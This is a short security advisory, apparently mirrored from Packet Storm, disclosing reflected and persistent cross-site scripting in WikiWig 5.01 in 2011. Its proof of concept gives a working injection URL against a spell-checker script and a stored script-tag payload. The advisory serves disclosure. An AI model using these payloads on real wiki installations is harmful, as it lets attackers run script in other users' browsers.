@@ -1,0 +1,31 @@
+Source: http://packetstormsecurity.org/files/view/99363/wikiwig501-xss.txt
+
+------------------------------------------------------------------------
+Software................WikiWig 5.01
+Vulnerability...........Persistent/Reflected Cross-site Scripting
+Threat Level............Moderate (2/5)
+Download................http://wikiwig.sourceforge.net/
+Disclosure Date.........3/10/2011
+Tested On...............Windows Vista + XAMPP
+------------------------------------------------------------------------
+Author..................AutoSec Tools
+Site....................http://www.autosectools.com/
+Email...................John Leitch <john@autosectools.com>
+------------------------------------------------------------------------
+
+
+--Description--
+
+A persistent/reflected cross-site scripting vulnerability in WikiWig
+5.01 can be exploited to execute arbitrary JavaScript.
+
+
+--PoC--
+
+Reflected:
+http://localhost/wikiwig5.01/_wk/Xinha/plugins/SpellChecker/spell-check-savedicts.php?to_r_list=%3Cscript%3Ealert(0)%3C%2fscript%3E
+
+Persistent:
+Create a user account. Edit any page and add script tags.
+
+<script>alert(0)</script>
